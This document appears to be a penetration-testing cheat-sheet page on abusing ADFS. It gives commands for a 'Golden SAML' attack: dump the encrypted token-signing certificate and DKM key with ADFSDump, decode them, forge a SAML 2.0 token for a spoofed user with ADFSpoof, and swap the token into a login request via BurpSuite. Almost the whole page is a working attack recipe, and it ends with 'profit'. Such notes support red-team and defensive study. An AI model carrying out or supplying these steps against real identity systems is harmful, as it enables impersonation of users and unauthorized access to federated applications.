---
title: "ADFS"
date: 2024-9-14
tags: ["SAML", "Token-Based Authentication", "ADFS", "Active Directory", "Windows", "Federation Services"]
---

### Abuse #1: Generate a SAML 2.0 token for some app

{{< tab set1 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Dump encrypted PFX and DKM key

```console
# With ADFS service account
.\ADFSDump.exe
```

<small>*Ref: [ADFSDump](https://github.com/mandiant/ADFSDump)*</small>

#### 2. Convert to binary blob

```console
# Copy private key(s)
echo '<PRIVATE_KEY>' | sed 's/-//g' | xxd -r -p > DkmKey.bin
```

```console
# Copy Encrypted Token Signing Key Begin ... Encrypted Token Signing Key End
cat b64_blob | base64 -d > EncryptedPfx.bin
```

#### 3. Check which private key is correct

```console
# The correct key will not show error
python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin dump
```

<small>*Ref: [ADFSpoof](https://github.com/mandiant/ADFSpoof)*</small>

#### 4. Generate SAML 2.0 token

```console
# Copy info from ADFS dump
python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s <SERVER> saml2 --endpoint <SIGN_IN_ENDPOINT> --nameidformat urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress --nameid <SPOOF_USER>@<DOMAIN> --rpidentifier <IDENTIFIER> --assertions '<Attribute Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"><AttributeValue><SPOOF_USER>@<DOMAIN></AttributeValue></Attribute><Attribute Name="http://schemas.xmlsoap.org/claims/CommonName"><AttributeValue><SPOOF_USER></AttributeValue></Attribute>' 
```

#### 5. Modify request in BurpSuite

```console
+-------------------------------------------------------------+
| 1. Enable Intercept in Proxy Tab                            |
| 2. Sign In with the Web App                                 |
| 3. Click Forward until the POST request with 'SAMLResponse' |
| 4. Replace the payload and Forward                          |
| 5. Disable Intercept and profit                             |
+-------------------------------------------------------------+
```

{{< /tabcontent >}}
